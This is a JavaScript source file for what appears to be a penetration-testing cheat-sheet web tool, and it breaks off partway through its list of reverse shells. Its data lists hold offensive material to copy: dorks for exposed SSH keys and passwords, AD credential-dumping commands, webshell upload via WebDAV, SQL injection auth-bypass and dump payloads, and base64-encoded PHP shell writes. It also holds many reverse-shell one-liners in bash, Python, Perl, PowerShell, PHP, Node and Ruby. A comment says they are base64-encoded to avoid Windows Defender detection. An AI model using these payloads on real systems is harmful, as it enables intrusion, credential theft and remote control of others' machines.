
$(function () {
  let STORAGE_KEY = null;
  let storageInfo = null;

  // --- Setup OSINT list ---
  STORAGE_KEY = 'OSINT_ENV';
  storageInfo = JSON.parse(window.sessionStorage.getItem(STORAGE_KEY));
  const osintRhost = (storageInfo && storageInfo.RHOST) || 'example.com';
  const osint = new Osint('#mytoolOsint', ['#osintDnsList', '#osintGoogleDorksList'], {
    'RHOST': '#osintInputRHOST',
    'SUBMIT': '#osintInputSubmit',
  })
  osint.STORAGE_KEY = STORAGE_KEY;
  osint.setup(osintRhost);
  osint.draw(osintRhost);

  // --- Setup recon list ---
  STORAGE_KEY = 'RECON_ENV';
  storageInfo = JSON.parse(window.sessionStorage.getItem(STORAGE_KEY));
  const reconRhost = (storageInfo && storageInfo.RHOST) || '10.0.0.1';
  const reconLport = (storageInfo && storageInfo.RPORT) || '4444';
  const recon = new Recon('#mytoolRecon', ['#reconNmapList', '#reconLDAPList'], {
    'RHOST': '#reconInputRHOST',
    'RPORT': '#reconInputRPORT',
    'SUBMIT': '#reconInputSubmit',
  })
  recon.STORAGE_KEY = STORAGE_KEY;
  recon.setup(reconRhost, reconLport);
  recon.draw(reconRhost, reconLport);

  // --- Setup web application penetration test list ---
  STORAGE_KEY = 'WEB_ENV';
  storageInfo = JSON.parse(window.sessionStorage.getItem(STORAGE_KEY));
  const webURL = (storageInfo && storageInfo.URL) || 'http://10.0.0.1';
  const webFilename = (storageInfo && storageInfo.FILENAME) || 'webshell';
  const web = new Web('#mytoolWeb', ['#webList', '#webShellList'], {
    'URL': '#webInputURL',
    'FILENAME': '#webInputFILENAME',
    'SUBMIT': '#webInputSubmit',
  })
  web.STORAGE_KEY = STORAGE_KEY;
  web.setup(webURL, webFilename);
  web.draw(webURL, webFilename);

  // --- Setup SQL Injection list ---
  const sqlinj = new SqlInj('#mytoolSqlInj', ['#sqlinjList'], {})
  sqlinj.setup();
  sqlinj.draw();

  // --- Setup reverse shell list ---
  STORAGE_KEY = 'REVSHELL_ENV';
  storageInfo = JSON.parse(window.sessionStorage.getItem(STORAGE_KEY));
  const revshlhost = (storageInfo && storageInfo.LHOST) || '10.0.0.1';
  const revshlport = (storageInfo && storageInfo.LPORT) || '4444';
  const revShell = new RevShell('#mytoolRevShell', ['#revshListener', '#revshList', '#revshFileList'], {
    'LHOST': '#revshInputLHOST',
    'LPORT': '#revshInputLPORT',
    'SUBMIT': '#revshInputSubmit',
  });
  revShell.STORAGE_KEY = STORAGE_KEY;
  revShell.setup(revshlhost, revshlport);
  revShell.draw(revshlhost, revshlport);

  // --- Setup upload and download list ---
  STORAGE_KEY = 'UPDOWN_ENV';
  storageInfo = JSON.parse(window.sessionStorage.getItem(STORAGE_KEY));
  const updownlhost = (storageInfo && storageInfo.LHOST) || '10.0.0.1';
  const updownlport = (storageInfo && storageInfo.LPORT) || '4444';
  const updownfilename = (storageInfo && storageInfo.FILENAME) || 'linpeas.sh';
  const upDown = new UpDown('#mytoolUpDown', ['#updownUpList', '#updownDownList'], {
    'LHOST': '#updownInputLHOST',
    'LPORT': '#updownInputLPORT',
    'FILENAME': '#updownInputFILENAME',
    'SUBMIT': '#updownInputSubmit',
  })
  upDown.STORAGE_KEY = STORAGE_KEY;
  upDown.setup(updownlhost, updownlport, updownfilename);
  upDown.draw(updownlhost, updownlport, updownfilename);

  // --- Setup password cracking list ---
  STORAGE_KEY = 'PASSCRACKING_ENV';
  storageInfo = JSON.parse(window.sessionStorage.getItem(STORAGE_KEY));
  const passcrackFilename = (storageInfo && storageInfo.FILENAME) || 'hash.txt';
  const passcrack = new PassCrack('#mytoolPassCrack', ['#passcrackList'], {
    'FILENAME': '#passcrackInputFILENAME',
    'SUBMIT': '#passcrackInputSubmit',
  })
  passcrack.STORAGE_KEY = STORAGE_KEY;
  passcrack.setup(passcrackFilename);
  passcrack.draw(passcrackFilename);

  // --- Setup privilege escalation list ---
  STORAGE_KEY = 'PRIVESC_ENV';
  storageInfo = JSON.parse(window.sessionStorage.getItem(STORAGE_KEY));
  const privescLhost = (storageInfo && storageInfo.LHOST) || '10.0.0.1';
  const privescLport = (storageInfo && storageInfo.LPORT) || '4444';
  const privesc = new PrivEsc('#mytoolPrivEsc', ['#privescLinuxList', '#privescWindowsList'], {
    'LHOST': '#privescInputLHOST',
    'LPORT': '#privescInputLPORT',
    'SUBMIT': '#privescInputSubmit',
  })
  privesc.STORAGE_KEY = STORAGE_KEY;
  privesc.setup(privescLhost, privescLport);
  privesc.draw(privescLhost, privescLport);


  // URLのハッシュ(#以降の文字列)で初期表示ページの切り替え
  const myTabButton = document.querySelector(`#myTab button[data-bs-target="${location.hash}"]`);
  if (myTabButton) {
    $(myTabButton).trigger('click');
  }
  
});


// ---- My Tool ----------------------------------------------------------------
class MyTool {
  constructor(topCSSSelector, targetCSSSelectors, inputCSSSelectors) {
    this.topCSSSelector     = topCSSSelector;     // TOPのCSSセレクタ(ID)
    this.targetCSSSelectors = targetCSSSelectors; // リストのCSSセレクタの一覧
    this.inputCSSSelectors  = inputCSSSelectors;  // 入力フォームのCSSセレクタの一覧
    this.targetContents = {}; // コピー項目一覧
  }

  setup(...args) {
    const submit = () => {
      // 入力項目をinfoに格納する
      const info = {}
      for (let i = 0; i < args.length; i++) {
        const inputCSSSelectorKey = inputCSSSelectorsKeys[i];
        const inputCSSSelector = this.inputCSSSelectors[inputCSSSelectorKey];
        const value = $(inputCSSSelector).val().toString();

        info[inputCSSSelectorKey] = value;
      }

      // 入力項目に1つ以上空白があるか
      let isAnyEmpty = false;
      for (const key in info) {
        if (Object.hasOwnProperty.call(info, key)) {
          const element = info[key];
          if (element === undefined || element === "") {
            isAnyEmpty = true;
          }
        }
      }

      // 入力項目が全て入力されているとき
      if (!isAnyEmpty) {
        // Clear
        for (let i = 0; i < this.targetCSSSelectors.length; i++) {
          const targetCSSSelector = this.targetCSSSelectors[i];
          $(targetCSSSelector).empty();
        }
        // Create
        this.draw(...Object.values(info));
        // Set LHOST and LPORT info into session storage.
        if (this.STORAGE_KEY) {
          window.sessionStorage.setItem(this.STORAGE_KEY, JSON.stringify(info));
        }
      }
    }

    // Set default value
    const inputCSSSelectorsKeys = Object.keys(this.inputCSSSelectors);
    for (let i = 0; i < args.length; i++) {
      const arg = args[i];
      const inputCSSSelectorKey = inputCSSSelectorsKeys[i];
      const inputCSSSelector = this.inputCSSSelectors[inputCSSSelectorKey];
      $(inputCSSSelector).val(arg);
    }

    // Set events
    for (let i = 0; i < inputCSSSelectorsKeys.length; i++) {
      const inputCSSSelectorKey = inputCSSSelectorsKeys[i];
      const inputCSSSelector = this.inputCSSSelectors[inputCSSSelectorKey];

      if (inputCSSSelectorKey === 'SUBMIT') { // Submitボタンのとき
        // Submit when click button
        $(inputCSSSelector).click(submit);
      } else { // 入力テキストのとき
        // Submit when press enter key.
        $(inputCSSSelector).keypress(function (e) {
          if (e.which === 13) { submit(); return false; }
        });
      }
    }
  }

  draw(...args) {
    // 各リストの作成
    let index = -1;
    for (const key in this.targetContents) {
      index += 1;
      if (Object.hasOwnProperty.call(this.targetContents, key)) {
        const targetContent = this.targetContents[key];
        this.drawList(index, targetContent, ...args);
      }
    }
    // 各リストの要素がクリックでコピーできるようにイベントリスナを設定する
    this.setupCopyItem(this.topCSSSelector);
  }

  drawList(index, targetContent, ...args) {
    throw new Error("Not Implemented Error!");
  }

  setupCopyItem(CSSSelector) {
    // コピー可能な項目はクリック時にクリップボードにコピーする。
    $(`${CSSSelector} .copy_article`).each(function (index, element) {
      const $revsh = $(element);
      $revsh.mouseup(function () {
        // 文字列範囲選択中はClickを発火させない
        if (String(document.getSelection()).length !== 0) return false;
        // 枠内をクリックするとコピーボタンを押下する
        $revsh.find('.copy_input').trigger('click');
        return false;
      });
  
      // Copy Button
      const $copy_input = $revsh.find('.copy_input');
      $copy_input.click(function () {
        // 対象の文字列をinputに格納してからコピーする
        const text = $revsh.find('.copy_target').text();
        $('#input').val(text);
        var copyText = document.querySelector("#input");
        copyText.select();
        document.execCommand("copy");
        // コピー完了したらツールチップ表示
        $(this).tooltip('show');
        // コピー完了したら強調表示
        $('.my-active').removeClass('my-active');
        $revsh.addClass('my-active');
        return false;
      });
      //「Copy」ボタンのツールチップ（補足説明）の設定
      $copy_input.tooltip({trigger: 'manual'})
        .on('shown.bs.tooltip', function () { // tooltip表示後の動作を設定
          setTimeout((function () {
            $(this).tooltip('hide');
          }).bind(this), 1500);
        });
    });
  }
}

// ---- OSINT ------------------------------------------------------------------
class Osint extends MyTool {
  constructor(...args) {
    super(...args);

    this.targetContents['1.DNS'] = [
      {'title': 'nslookup - SPF', 'cmd': 'nslookup -type=SPF {0}'},
      {'title': 'nslookup - DMARC', 'cmd': 'nslookup -type=txt _dmarc.{0}'},
      {'title': 'dig - A (IP Version 4 Address records)', 'cmd': 'dig A {0}'},
      {'title': 'dig - AAAA (IP Version 6 Address records)', 'cmd': 'dig AAAA {0}'},
      {'title': 'dig - CNAME (Canonical Name records)', 'cmd': 'dig CNAME {0}'},
      {'title': 'dig - HINFO (Host Information records)', 'cmd': 'dig HINFO {0}'},
      {'title': 'dig - ISDN (Integrated Services Digital Network records)', 'cmd': 'dig ISDN {0}'},
      {'title': 'dig - MX (Mail exchanger record)', 'cmd': 'dig MX {0}'},
      {'title': 'dig - NS (Name Server records)', 'cmd': 'dig NS {0}'},
      {'title': 'dig - PTR (Reverse-lookup Pointer records)', 'cmd': 'dig PTR {0}'},
      {'title': 'dig - SOA (Start of Authority records)', 'cmd': 'dig SOA {0}'},
      {'title': 'dig - TXT (Text records)', 'cmd': 'dig TXT {0}'},
      {'title': 'Zone Transfer', 'cmd': 'dig axfr HOSTNAME @IPADDR'},
    ];

    this.targetContents['2.GoogleDorks'] = [
      {'title': 'Log files', 'cmd': '{0} allintext:username filetype:log'},
      {'title': 'Vulnerable web servers', 'cmd': '{0} inurl:/proc/self/cwd'},
      {'title': 'Open FTP servers', 'cmd': '{0} intitle:"index of" inurl:ftp'},
      {'title': 'ENV files', 'cmd': '{0} filetype:env "DB_PASSWORD"'},
      {'title': 'SSH private keys', 'cmd': '{0} intitle:index.of id_rsa -id_rsa.pub'},
      {'title': 'SSH private keys', 'cmd': '{0} filetype:log username putty'},
      {'title': 'Email lists', 'cmd': '{0} filetype:xls inurl:"email.xls"'},
      {'title': 'Live cameras', 'cmd': '{0} intitle:"webcamXP 5"'},
      {'title': 'MP3, Movie, and PDF files', 'cmd': '{0} intitle: index of mp3'},
      {'title': 'MP3, Movie, and PDF files', 'cmd': '{0} intitle: index of pdf'},
      {'title': 'MP3, Movie, and PDF files', 'cmd': '{0} intext: .mp4'},
      {'title': 'Weather', 'cmd': '{0} intitle:"Weather Wing WS-2"'},
      {'title': 'Zoom videos', 'cmd': '{0} inurl:zoom.us/j and intext:scheduled for'},
      {'title': 'SQL dumps', 'cmd': '{0} "index of" "database.sql.zip"'},
      {'title': 'WordPress Admin', 'cmd': '{0} intitle:"Index of" wp-admin'},
      {'title': 'Apache2', 'cmd': '{0} intitle:"Apache2 Ubuntu Default Page: It works"'},
      {'title': 'phpMyAdmin', 'cmd': '{0} "Index of" inurl:phpmyadmin'},
      {'title': 'JIRA/Kibana', 'cmd': '{0} inurl:Dashboard.jspa intext:"Atlassian Jira Project Management Software"'},
      {'title': 'JIRA/Kibana', 'cmd': '{0} inurl:app/kibana intext:Loading Kibana'},
      {'title': 'cPanel password reset', 'cmd': '{0} inurl:_cpanel/forgotpwd'},
      {'title': 'Government documents', 'cmd': '{0} allintitle: restricted filetype:doc site:gov'},
    ];
  }

  drawList(index, targetContent, rhost) {
    for (let i = 0; i < targetContent.length; i++) {
      const content = targetContent[i];
      let title = content.title;
      let cmd = content.cmd;
      cmd = cmd.replace('{0}', `<span class="bg-warning">${htmlEscape(rhost)}</span>`);
      // Template
      $(this.targetCSSSelectors[index]).append(`
      <li class="list-group-item d-flex justify-content-between align-items-start copy_article">
        <div class="ms-2 me-auto" style="width: 80%">
          <div class="fw-bold">${title}</div>
          <code class="copy_target">${cmd}</code>
        </div>
        <button type="button" class="btn btn-outline-primary copy_input" data-bs-toggle="tooltip" data-bs-placement="top" title="Copy to clipboard">Copy</button>
      </li>
      `);
    }
  }
}

// ---- Reconnaissance ----------------------------------------------------------
class Recon extends MyTool {
  constructor(...args) {
    super(...args);

    this.targetContents['1.nmap'] = [
      {'title': 'nmap', 'cmd': 'nmap -T4 -A -v {0}'},
      {'title': 'nmap', 'cmd': 'nmap -sC -sV -O -n -o nmapscan.txt {0}'},
      {'title': 'nmap', 'cmd': 'nmap -sC -sV -p{1} "{0}" -o nmapscan.txt'},
      {'title': 'vuln', 'cmd': 'nmap -Pn --script vuln {0}'},
    ];

    this.targetContents['LDAP'] = [
      {'title': 'nmap', 'cmd': 'nmap --script=ldap-search {0}'},
      {'title': 'enum4linux', 'cmd': 'enum4linux {0}'},
      {'title': 'enum4linux (extracting users)', 'cmd': `enum4linux {0} | grep -E '^user:' | cut -d "[" -f 2 | cut -d "]" -f 1 > users.txt`},
      {'title': 'impacket (ASREPRoast Attack)', 'cmd': 'python3 GetNPUsers.py $DOMAIN/ -usersfile "users.txt" -format john -outputfile "GetNPUsers.result"'},
      {'title': 'impacket secretsdump', 'cmd': 'python3 secretsdump.py $DOMAIN/$USERNAME:$PASSWORD@{0}'},
    ]
  }

  drawList(index, targetContent, rhost, rport) {
    for (let i = 0; i < targetContent.length; i++) {
      const content = targetContent[i];
      let title = content.title;
      let cmd = content.cmd;
      cmd = cmd.replace('{0}', `<span class="bg-warning">${htmlEscape(rhost)}</span>`);
      cmd = cmd.replace('{1}', `<span class="bg-warning">${htmlEscape(rport)}</span>`);
      // Template
      $(this.targetCSSSelectors[index]).append(`
      <li class="list-group-item d-flex justify-content-between align-items-start copy_article">
        <div class="ms-2 me-auto" style="width: 80%">
          <div class="fw-bold">${title}</div>
          <code class="copy_target">${cmd}</code>
        </div>
        <button type="button" class="btn btn-outline-primary copy_input" data-bs-toggle="tooltip" data-bs-placement="top" title="Copy to clipboard">Copy</button>
      </li>
      `);
    }
  }
}

// ---- Web Application Penetration Test ---------------------------------------
class Web extends MyTool {
  constructor(...args) {
    super(...args);

    this.targetContents['1.WAPT'] = [
      {'title': 'Check Header', 'cmd': 'curl -v "{0}"'},
      {'title': 'gobuster', 'cmd': 'gobuster dir -w /usr/share/wordlists/dirb/common.txt -u "{0}"'},
      {'title': 'nikto', 'cmd': 'nikto --url "{0}"'},
      {'title': 'WebDAV', 'cmd': 'curl -v -X OPTIONS "{0}"'},
      {'title': 'WebDAV', 'cmd': 'davtest -url "{0}"'},
      {'title': 'WebDAV', 'cmd': `curl -v -X PUT '{0}/{1}.php' -d @{1}.php`},
      {'title': '1. PUT txt file', 'cmd': `curl -v -X PUT '{0}/{1}.txt' --data-binary @{1}.php`},
      {'title': '2. MOVE from txt to php', 'cmd': `curl -v -X MOVE '{0}/{1}.txt' --header 'Destination: {0}/{1}.php'`},
      {'title': 'Wordpress', 'cmd': 'wpscan --disable-tls-checks --url "{0}"'},
      {'title': '1. CMSmap', 'cmd': 'git clone https://github.com/Dionach/CMSmap && cd CMSmap && pip3 install .'},
      {'title': '2. CMSmap', 'cmd': 'cmsmap "{0}"'},
    ];

    this.targetContents['2.WebShell'] = [
      {'title': 'JSP', 'cmd': 'cp /usr/share/webshells/jsp/cmdjsp.jsp cmd.jsp'},
      {'title': 'ASP', 'cmd': 'cp /usr/share/webshells/asp/cmdasp.asp cmd.asp'},
      {'title': 'ASP', 'cmd': 'cp /usr/share/webshells/asp/cmd-asp-5.1.asp cmd.asp'},
      {'title': 'ASPX', 'cmd': 'cp /usr/share/webshells/aspx/cmdasp.aspx cmd.aspx'},
      {'title': 'PHP', 'cmd': 'cp /usr/share/webshells/php/simple-backdoor.php cmd.php'},
      {'title': 'PHP', 'cmd': 'cp /usr/share/webshells/php/qsd-php-backdoor.php cmd.php'},
      {'title': 'PHP', 'cmd': 'cp /usr/share/webshells/php/php-backdoor.php cmd.php'},
      {'title': 'Perl (CGI)', 'cmd': 'cp /usr/share/webshells/perl/perlcmd.cgi cmd.cgi'},
    ];
  }

  drawList(index, targetContent, url, filename) {
    for (let i = 0; i < targetContent.length; i++) {
      const content = targetContent[i];
      let title = content.title;
      let cmd = "";
      if (content.base64) {
        cmd = atob(content.base64);
      } else {
        cmd = content.cmd;
      }
      cmd = cmd.replaceAll('{0}', `<span class="bg-warning">${htmlEscape(url)}</span>`);
      cmd = cmd.replaceAll('{1}', `<span class="bg-warning">${htmlEscape(filename)}</span>`);
      // Template
      $(this.targetCSSSelectors[index]).append(`
      <li class="list-group-item d-flex justify-content-between align-items-start copy_article">
        <div class="ms-2 me-auto" style="width: 80%">
          <div class="fw-bold">${title}</div>
          <code class="copy_target">${cmd}</code>
        </div>
        <button type="button" class="btn btn-outline-primary copy_input" data-bs-toggle="tooltip" data-bs-placement="top" title="Copy to clipboard">Copy</button>
      </li>
      `);
    }
  }
}

// ---- SQL Injection ---------------------------------------------------
class SqlInj extends MyTool {
  constructor(...args) {
    super(...args);

    this.targetContents['1'] = [
      {'title': '1. sql - auth bypass', 'cmd': `' or 'x'='x`},
      {'title': '1. sql - auth bypass', 'cmd': `') or ('x')=('x`},
      {'title': '1. sql - auth bypass', 'cmd': `')) or (('x'))=(('x`},
      {'title': '1. sql - auth bypass', 'cmd': `1 or 1=1-- `},
      {'title': '1. sql - auth bypass', 'cmd': `' or 1=1-- `},
      {'title': '1. sql - auth bypass', 'cmd': `') or 1=1-- `},
      {'title': '1. sql - auth bypass', 'cmd': `1/**/or/**/1=1/**/--`},
      {'title': '2. sql - determine table columns count', 'cmd': `') order by 1 -- `},
      {'title': '2. sql - determine table columns count', 'cmd': `') order by 2 -- `},
      {'title': '2. sql - determine table columns count', 'cmd': `') order by 3 -- `},
      {'title': '2. sql - determine table columns count', 'cmd': `') order by 4 -- `},
      {'title': '2. sql - determine table columns count', 'cmd': `') order by 5 -- `},
      {'title': '3. sql - SQLite > Tables', 'cmd': `ZZZ')) UnIoN SeLeCt 1,2,group_concat(tbl_name),null,null from sqlite_master where type='table' --`},
      {'title': '3. sql - SQLite > Table Columns', 'cmd': `ZZZ')) UnIoN SeLeCt 1,2,sql,null,null from sqlite_master where type='table' and tbl_name='Users' --`},
      {'title': '3. sql - SQLite > Table dump', 'cmd': `ZZZ')) union select username,email,password,null,null from Users --`},
      {'title': 'sql', 'cmd': ``},
      {'title': '9. sql', 'base64': 'U0VMRUNUICZxdW90OyZsdDsmcXVlc3Q7cGhwIHN5c3RlbSZscGFyOyZkb2xsYXI7Jmxvd2JhcjtHRVQmbHNxYjsmYXBvcztxJmFwb3M7JnJzcWI7JnJwYXI7JnNlbWk7ICZxdWVzdDsmZ3Q7JnF1b3Q7IGludG8gb3V0ZmlsZSAmcXVvdDsmc29sO3ZhciZzb2w7d3d3JnNvbDtodG1sJnNvbDtzaGVsbCZwZXJpb2Q7cGhwJnF1b3Q7'},
      {'title': '9. sql', 'base64': 'c2VsZWN0ICZxdW90OyZsdDsmcXVlc3Q7cGhwIHN5c3RlbSZscGFyOyZkb2xsYXI7Jmxvd2JhcjtHRVQmbHNxYjsmYXBvcztxJmFwb3M7JnJzcWI7JnJwYXI7JnNlbWk7ICZxdWVzdDsmZ3Q7JnF1b3Q7IGludG8gb3V0ZmlsZSAmcXVvdDtDJmNvbG9uOyZic29sOyZic29sO3hhbXBwJmJzb2w7JmJzb2w7aHRkb2NzJmJzb2w7JmJzb2w7Y21kJnBlcmlvZDtwaHAmcXVvdDs='},
      {'title': 'sql', 'cmd': ``},
    ];
  }

  drawList(index, targetContent) {
    for (let i = 0; i < targetContent.length; i++) {
      const content = targetContent[i];
      let title = content.title;
      let cmd = content.cmd;
      if (content.base64) {
        // base64デコードする
        cmd = atob(content.base64);
      }
      // Template
      $(this.targetCSSSelectors[index]).append(`
      <li class="list-group-item d-flex justify-content-between align-items-start copy_article">
        <div class="ms-2 me-auto" style="width: 80%">
          <div class="fw-bold">${title}</div>
          <code class="copy_target">${cmd}</code>
        </div>
        <button type="button" class="btn btn-outline-primary copy_input" data-bs-toggle="tooltip" data-bs-placement="top" title="Copy to clipboard">Copy</button>
      </li>
      `);
    }
  }
}

// ---- Reverse Shell ----------------------------------------------------------
class RevShell extends MyTool {
  constructor(...args) {
    super(...args);

    // 1. Listen
    this.targetContents['1.Listen'] = [
      {'title': '@Kali (netcat)', 'cmd': 'nc -lnvp {1}'},
    ];

    // 2. Connect back
    // ローカル開発時にWindows Definderに検知されないようにBase64で保存すること。
    // LHOST: {0}, LPORT: {1}
    this.targetContents['2.Connectback'] = [
      {'title': "Bash", 'base64': 'YmFzaCAtaSA+JiAvZGV2L3RjcC97MH0vezF9IDA+JjE='},
      {'title': "Bash", 'base64': 'MDwmMTk2O2V4ZWMgMTk2PD4vZGV2L3RjcC97MH0vezF9OyBzaCA8JjE5NiA+JjE5NiAyPiYxOTY='},
      {'title': 'Bash (Base64)', 'base64': 'YmFzaCAtaSA+JiAvZGV2L3RjcC97MH0vezF9IDA+JjE=', 'cmd': 'echo {0} | base64 -d | bash'},
      {'title': 'Python', 'base64': 'cHl0aG9uIC1jICdpbXBvcnQgc29ja2V0LHN1YnByb2Nlc3Msb3M7cz1zb2NrZXQuc29ja2V0KHNvY2tldC5BRl9JTkVULHNvY2tldC5TT0NLX1NUUkVBTSk7cy5jb25uZWN0KCgiezB9Iix7MX0pKTtvcy5kdXAyKHMuZmlsZW5vKCksMCk7IG9zLmR1cDIocy5maWxlbm8oKSwxKTsgb3MuZHVwMihzLmZpbGVubygpLDIpO3A9c3VicHJvY2Vzcy5jYWxsKFsiL2Jpbi9zaCIsIi1pIl0pOyc='},
      {'title': 'Python3', 'base64': 'cHl0aG9uMyAtYyAnaW1wb3J0IHNvY2tldCxzdWJwcm9jZXNzLG9zO3M9c29ja2V0LnNvY2tldChzb2NrZXQuQUZfSU5FVCxzb2NrZXQuU09DS19TVFJFQU0pO3MuY29ubmVjdCgoInswfSIsezF9KSk7b3MuZHVwMihzLmZpbGVubygpLDApOyBvcy5kdXAyKHMuZmlsZW5vKCksMSk7IG9zLmR1cDIocy5maWxlbm8oKSwyKTtwPXN1YnByb2Nlc3MuY2FsbChbIi9iaW4vc2giLCItaSJdKTsn'},
      {'title': 'Perl', 'base64': 'cGVybCAtZSAndXNlIFNvY2tldDskaT0iezB9IjskcD17MX07c29ja2V0KFMsUEZfSU5FVCxTT0NLX1NUUkVBTSxnZXRwcm90b2J5bmFtZSgidGNwIikpO2lmKGNvbm5lY3QoUyxzb2NrYWRkcl9pbigkcCxpbmV0X2F0b24oJGkpKSkpe3tvcGVuKFNURElOLCI+JlMiKTtvcGVuKFNURE9VVCwiPiZTIik7b3BlbihTVERFUlIsIj4mUyIpO2V4ZWMoIi9iaW4vc2ggLWkiKTt9fTsn'},
      {'title': 'Perl', 'base64': 'cGVybCAtTUlPIC1lICckcD1mb3JrO2V4aXQsaWYoJHApOyRjPW5ldyBJTzo6U29ja2V0OjpJTkVUKFBlZXJBZGRyLCJ7MH06ezF9Iik7U1RESU4tPmZkb3BlbigkYyxyKTskfi0+ZmRvcGVuKCRjLHcpO3N5c3RlbSRfIHdoaWxlPD47Jw=='},
      {'title': 'Perl (Windows)', 'base64': 'cGVybCAtTUlPIC1lICckYz1uZXcgSU86OlNvY2tldDo6SU5FVChQZWVyQWRkciwiezB9OnsxfSIpO1NURElOLT5mZG9wZW4oJGMscik7JH4tPmZkb3BlbigkYyx3KTtzeXN0ZW0kXyB3aGlsZTw+Oyc='},
      {'title': 'PowerShell', 'base64': 'cG93ZXJzaGVsbCAtTm9QIC1Ob25JIC1XIEhpZGRlbiAtRXhlYyBCeXBhc3MgLUNvbW1hbmQgTmV3LU9iamVjdCBTeXN0ZW0uTmV0LlNvY2tldHMuVENQQ2xpZW50KCJ7MH0iLHsxfSk7JHN0cmVhbSA9ICRjbGllbnQuR2V0U3RyZWFtKCk7W2J5dGVbXV0kYnl0ZXMgPSAwLi42NTUzNXwlezB9O3doaWxlKCgkaSA9ICRzdHJlYW0uUmVhZCgkYnl0ZXMsIDAsICRieXRlcy5MZW5ndGgpKSAtbmUgMCl7ezskZGF0YSA9IChOZXctT2JqZWN0IC1UeXBlTmFtZSBTeXN0ZW0uVGV4dC5BU0NJSUVuY29kaW5nKS5HZXRTdHJpbmcoJGJ5dGVzLDAsICRpKTskc2VuZGJhY2sgPSAoaWV4ICRkYXRhIDI+JjEgfCBPdXQtU3RyaW5nICk7JHNlbmRiYWNrMiAgPSAkc2VuZGJhY2sgKyAiUFMgIiArIChwd2QpLlBhdGggKyAiPiAiOyRzZW5kYnl0ZSA9IChbdGV4dC5lbmNvZGluZ106OkFTQ0lJKS5HZXRCeXRlcygkc2VuZGJhY2syKTskc3RyZWFtLldyaXRlKCRzZW5kYnl0ZSwwLCRzZW5kYnl0ZS5MZW5ndGgpOyRzdHJlYW0uRmx1c2goKX19OyRjbGllbnQuQ2xvc2UoKQ=='},
      {'title': 'PowerShell', 'base64': 'cG93ZXJzaGVsbCAtbm9wIC1jICIkY2xpZW50ID0gTmV3LU9iamVjdCBTeXN0ZW0uTmV0LlNvY2tldHMuVENQQ2xpZW50KCd7MH0nLHsxfSk7JHN0cmVhbSA9ICRjbGllbnQuR2V0U3RyZWFtKCk7W2J5dGVbXV0kYnl0ZXMgPSAwLi42NTUzNXwlezB9O3doaWxlKCgkaSA9ICRzdHJlYW0uUmVhZCgkYnl0ZXMsIDAsICRieXRlcy5MZW5ndGgpKSAtbmUgMCl7ezskZGF0YSA9IChOZXctT2JqZWN0IC1UeXBlTmFtZSBTeXN0ZW0uVGV4dC5BU0NJSUVuY29kaW5nKS5HZXRTdHJpbmcoJGJ5dGVzLDAsICRpKTskc2VuZGJhY2sgPSAoaWV4ICRkYXRhIDI+JjEgfCBPdXQtU3RyaW5nICk7JHNlbmRiYWNrMiA9ICRzZW5kYmFjayArICdQUyAnICsgKHB3ZCkuUGF0aCArICc+ICc7JHNlbmRieXRlID0gKFt0ZXh0LmVuY29kaW5nXTo6QVNDSUkpLkdldEJ5dGVzKCRzZW5kYmFjazIpOyRzdHJlYW0uV3JpdGUoJHNlbmRieXRlLDAsJHNlbmRieXRlLkxlbmd0aCk7JHN0cmVhbS5GbHVzaCgpfX07JGNsaWVudC5DbG9zZSgpIg=='},
      {'title': 'PHP', 'base64': 'cGhwIC1yICckc29jaz1mc29ja29wZW4oInswfSIsezF9KTtleGVjKCIvYmluL3NoIC1pIDwmMyA+JjMgMj4mMyIpOyc='},
      {'title': 'PHP', 'base64': 'cGhwIC1yICckcz1mc29ja29wZW4oInswfSIsezF9KTtzaGVsbF9leGVjKCIvYmluL3NoIC1pIDwmMyA+JjMgMj4mMyIpOyc='},
      {'title': 'PHP', 'base64': 'cGhwIC1yICckcz1mc29ja29wZW4oInswfSIsezF9KTtgL2Jpbi9zaCAtaSA8JjMgPiYzIDI+JjNgOyc='},
      {'title': 'PHP', 'base64': 'cGhwIC1yICckcz1mc29ja29wZW4oInswfSIsezF9KTtzeXN0ZW0oIi9iaW4vc2ggLWkgPCYzID4mMyAyPiYzIik7Jw=='},
      {'title': 'PHP', 'base64': 'cGhwIC1yICckcz1mc29ja29wZW4oInswfSIsezF9KTtwb3BlbigiL2Jpbi9zaCAtaSA8JjMgPiYzIDI+JjMiLCAiciIpOyc='},
      {'title': 'PHP', 'base64': 'cGhwIC1yICckc29jaz1mc29ja29wZW4oInswfSIsezF9KTsgJHByb2MgPSBwcm9jX29wZW4oIi9iaW4vc2ggLWkiLCBhcnJheSgwPT4kc29jaywgMT0+JHNvY2ssIDI9PiRzb2NrKSwgJHBpcGVzKTsn'},
      {'title': 'Node.js', 'base64': 'KGZ1bmN0aW9uKCl7e3ZhciBuZXQ9cmVxdWlyZSgibmV0IiksY3A9cmVxdWlyZSgiY2hpbGRfcHJvY2VzcyIpLHNoPWNwLnNwYXduKCIvYmluL3NoIixbXSk7dmFyIGNsaWVudD1uZXcgbmV0LlNvY2tldCgpO2NsaWVudC5jb25uZWN0KHsxfSwiezB9IixmdW5jdGlvbigpe3tjbGllbnQucGlwZShzaC5zdGRpbik7c2guc3Rkb3V0LnBpcGUoY2xpZW50KTtzaC5zdGRlcnIucGlwZShjbGllbnQpO319KTtyZXR1cm4gL2EvO319KSgpOw=='},
      {'title': 'Ruby', 'base64': 'cnVieSAtcnNvY2tldCAtZSdmPVRDUFNvY2tldC5vcGVuKCJ7MH0iLHsxfSkudG9faTtleGVjIHNwcmludGYoIi9iaW4vc2ggLWkgPCYlZCA+JiVkIDI+JiVkIixmLGYsZikn'},
      {'title': 'Ruby', 'base64': 'cnVieSAtcnNvY2tldCAtZSAnZXhpdCBpZiBmb3JrO2M9VENQU29ja2V0Lm5ldygiezB9IiwiezF9Iik7d2hpbGUoY21kPWMuZ2V0cyk7SU8ucG9wZW4oY21kLCJyIil7e3xpb3xjLnByaW50IGlvLnJlYWR9fWVuZCc='},
      {'title': 'Ruby (Windows)', 'base64': 'cnVieSAtcnNvY2tldCAtZSAnYz1UQ1BTb2NrZXQubmV3KCJ7MH0iLCJ7MX0iKTt3aGlsZShjbWQ9Yy5nZXRzKTtJTy5wb3BlbihjbWQsInIiKXt7fGlvfGMucHJpbnQgaW8ucmVhZH19ZW5kJw=='},
